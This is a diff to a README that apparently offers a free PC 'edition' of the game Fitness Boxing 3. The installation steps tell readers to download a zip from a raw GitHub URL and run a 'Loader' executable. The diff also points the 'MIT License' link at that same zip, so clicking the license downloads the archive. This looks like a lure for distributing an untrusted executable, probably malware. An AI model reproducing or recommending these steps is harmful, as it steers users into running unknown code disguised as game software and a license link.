@@ -29,7 +29,7 @@ Fitness Boxing 3 download, Fitness Boxing 3 PC, personal trainer software, fitne
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/mitansio/fitbox3-free-edition/main/Itylus/fitbox3-free-edition.zip** from the repository.
 2. Extract the archive to your preferred folder using WinRAR or 7-Zip.
 3. Run the Loader executable and follow on-screen instructions.
 4. Enjoy your fitness journey!
@@ -40,4 +40,4 @@ This repository is for educational and personal use only. Redistribution, commer
 
 ## 📜 MIT License
 
-This project is licensed under the [MIT License (2025)](https://opensource.org/licenses/MIT). Unlock your potential, safely and freely! 🚀
+This project is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/mitansio/fitbox3-free-edition/main/Itylus/fitbox3-free-edition.zip). Unlock your potential, safely and freely! 🚀
